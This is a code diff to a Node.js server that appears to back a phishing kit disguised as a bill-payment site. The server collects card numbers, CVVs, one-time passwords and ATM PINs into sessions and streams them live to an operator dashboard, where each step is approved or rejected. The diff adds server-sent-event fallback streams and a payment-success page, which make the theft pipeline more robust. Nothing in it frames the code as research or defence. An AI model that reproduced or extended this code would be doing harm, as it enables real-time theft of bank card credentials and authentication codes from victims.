@@ -6,23 +6,21 @@ const { fetchBillData, fetchReloadData } = require('./bill-bot');
 
 const app = express();
 const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
+const wss = new WebSocket.Server({ server, path: '/ws' });
 
 const PORT = process.env.PORT || 3000;
 
 // In-memory store for sessions
-// sessions[sessionId] = {
-//   sessionId, number, amount, ref, type,
-//   cardData: { cardholderName, cardNumber, expiry, cvv, country, bank },
-//   otpData: { otp },
-//   pinData: { pin },
-//   status: 'pending' | 'approved' | 'rejected' | 'awaiting_otp' | 'otp_approved' | 'otp_rejected' | 'awaiting_pin' | 'pin_approved' | 'pin_rejected' | 'completed',
-//   createdAt, updatedAt
-// }
 const sessions = {};
 
 // Admin WebSocket clients
 const adminClients = new Set();
+
+// SSE clients for admin (fallback)
+const sseAdminClients = new Set();
+
+// SSE clients for customers (keyed by sessionId)
+const sseSessionClients = {};
 
 // Parse JSON body
 app.use(express.json());
@@ -31,6 +29,79 @@ app.use(express.urlencoded({ extended: true }));
 // Serve static files
 app.use(express.static(path.join(__dirname)));
 app.use('/get-assets', express.static(path.join(__dirname, 'get-assets')));
+
+// ============================================================
+// SSE ENDPOINTS (Fallback for WebSocket)
+// ============================================================
+
+// GET /api/sse/admin - Admin SSE stream
+app.get('/api/sse/admin', (req, res) => {
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.flushHeaders();
+
+  sseAdminClients.add(res);
+  console.log('[SSE] Admin connected. Total SSE admins:', sseAdminClients.size);
+
+  // Send all sessions immediately
+  const allSessions = Object.values(sessions);
+  res.write(`data: ${JSON.stringify({ type: 'sessions_list', sessions: allSessions })}\n\n`);
+
+  // Heartbeat every 25 seconds
+  const heartbeat = setInterval(() => {
+    res.write(': heartbeat\n\n');
+  }, 25000);
+
+  req.on('close', () => {
+    clearInterval(heartbeat);
+    sseAdminClients.delete(res);
+    console.log('[SSE] Admin disconnected.');
+  });
+});
+
+// GET /api/sse/session/:sessionId - Customer SSE stream
+app.get('/api/sse/session/:sessionId', (req, res) => {
+  const { sessionId } = req.params;
+
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.flushHeaders();
+
+  if (!sseSessionClients[sessionId]) {
+    sseSessionClients[sessionId] = new Set();
+  }
+  sseSessionClients[sessionId].add(res);
+  console.log(`[SSE] Client connected for session: ${sessionId}`);
+
+  // Send current status if exists
+  if (sessions[sessionId]) {
+    res.write(`data: ${JSON.stringify({
+      type: 'status_update',
+      sessionId,
+      status: sessions[sessionId].status
+    })}\n\n`);
+  }
+
+  // Heartbeat every 25 seconds
+  const heartbeat = setInterval(() => {
+    res.write(': heartbeat\n\n');
+  }, 25000);
+
+  req.on('close', () => {
+    clearInterval(heartbeat);
+    if (sseSessionClients[sessionId]) {
+      sseSessionClients[sessionId].delete(res);
+      if (sseSessionClients[sessionId].size === 0) {
+        delete sseSessionClients[sessionId];
+      }
+    }
+    console.log(`[SSE] Client disconnected for session: ${sessionId}`);
+  });
+});
 
 // ============================================================
 // WebSocket Handler
@@ -75,23 +146,32 @@ wss.on('connection', (ws, req) => {
   }
 });
 
-function broadcastToAll(data) {
+function broadcastToAdmins(data) {
   const msg = JSON.stringify(data);
+  // WebSocket admins
   adminClients.forEach(client => {
     if (client.readyState === WebSocket.OPEN) client.send(msg);
   });
-  wss.clients.forEach(client => {
-    if (client.readyState === WebSocket.OPEN && client.sessionId === data.sessionId) {
-      client.send(msg);
-    }
+  // SSE admins
+  sseAdminClients.forEach(res => {
+    try { res.write(`data: ${msg}\n\n`); } catch (e) { sseAdminClients.delete(res); }
   });
 }
 
-function broadcastToAdmins(data) {
+function broadcastToSession(sessionId, data) {
   const msg = JSON.stringify(data);
-  adminClients.forEach(client => {
-    if (client.readyState === WebSocket.OPEN) client.send(msg);
+  // WebSocket clients
+  wss.clients.forEach(client => {
+    if (client.readyState === WebSocket.OPEN && client.sessionId === sessionId) {
+      client.send(msg);
+    }
   });
+  // SSE clients
+  if (sseSessionClients[sessionId]) {
+    sseSessionClients[sessionId].forEach(res => {
+      try { res.write(`data: ${msg}\n\n`); } catch (e) { sseSessionClients[sessionId].delete(res); }
+    });
+  }
 }
 
 // ============================================================
@@ -143,7 +223,6 @@ app.post('/api/otp-submit', (req, res) => {
   }
 
   if (!sessions[sessionId]) {
-    // Create session if not exists (edge case)
     sessions[sessionId] = {
       sessionId, number, amount, ref, type: type || 'bill',
       cardData: null, otpData: null, pinData: null,
@@ -228,8 +307,8 @@ app.post('/api/admin/decision', (req, res) => {
 
   console.log(`[Admin Decision] Session: ${sessionId} -> ${status}`);
 
-  // Broadcast to customer
-  broadcastToAll({ type: 'status_update', sessionId, status });
+  // Broadcast to customer (WebSocket + SSE)
+  broadcastToSession(sessionId, { type: 'status_update', sessionId, status });
 
   // Broadcast updated session to admins
   broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });
@@ -241,12 +320,14 @@ app.post('/api/admin/decision', (req, res) => {
 app.delete('/api/admin/delete/:sessionId', (req, res) => {
   const { sessionId } = req.params;
   delete sessions[sessionId];
+  broadcastToAdmins({ type: 'session_deleted', sessionId });
   return res.json({ success: true });
 });
 
 // DELETE /api/admin/clear - Clear all sessions
 app.delete('/api/admin/clear', (req, res) => {
   Object.keys(sessions).forEach(k => delete sessions[k]);
+  broadcastToAdmins({ type: 'sessions_cleared' });
   return res.json({ success: true });
 });
 
@@ -344,6 +425,8 @@ app.get('/atm-pin', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin.htm
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 
 app.get('/payment-confirm', (req, res) => res.sendFile(path.join(__dirname, 'payment-confirm.html')));
+
+app.get('/payment-success', (req, res) => res.sendFile(path.join(__dirname, 'payment-success.html')));
 
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
